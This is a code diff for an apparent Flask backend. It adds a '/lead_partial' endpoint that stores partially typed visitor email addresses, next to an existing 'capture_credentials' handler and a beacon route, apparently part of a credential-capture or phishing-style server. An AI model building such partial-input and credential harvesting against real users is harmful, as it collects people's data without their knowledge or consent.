@@ -28,6 +28,13 @@ def _validate_visit_token(data):
     verified_id = verify_visit_token(token, Config.VISIT_TOKEN_TTL_SECONDS)
     return verified_id == visit_id
 
+
+def _clean_partial_email(value: str) -> str:
+    if not value:
+        return ''
+    cleaned = ''.join(ch for ch in value.strip() if ch.isprintable())
+    return cleaned[:120]
+
 @bp.route('/beacon', methods=['POST'])
 @limiter.limit("60 per minute")
 def receive_beacon():
@@ -148,4 +155,33 @@ def capture_credentials():
     except Exception as e:
         print(f"Capture Error: {e}")
     
+    return "OK", 200
+
+
+@bp.route('/lead_partial', methods=['POST'])
+@limiter.limit("10 per minute")
+def lead_partial():
+    if not Config.ALLOW_PARTIAL_EMAIL_CAPTURE:
+        return "Disabled", 403
+
+    visit_id = request.form.get('visit_id')
+    visit_token = request.form.get('visit_token')
+    partial_email = _clean_partial_email(request.form.get('partial_email', ''))
+
+    if not _validate_visit_token({'visit_id': visit_id, 'visit_token': visit_token}):
+        return "Unauthorized", 403
+    if not visit_id or not partial_email:
+        return "Missing data", 400
+
+    visit = Visit.query.get(visit_id)
+    if not visit:
+        return "Not found", 404
+
+    note = f"partial_email:{partial_email}"
+    if visit.notes:
+        if note not in visit.notes:
+            visit.notes = f"{visit.notes} | {note}"
+    else:
+        visit.notes = note
+    db.session.commit()
     return "OK", 200
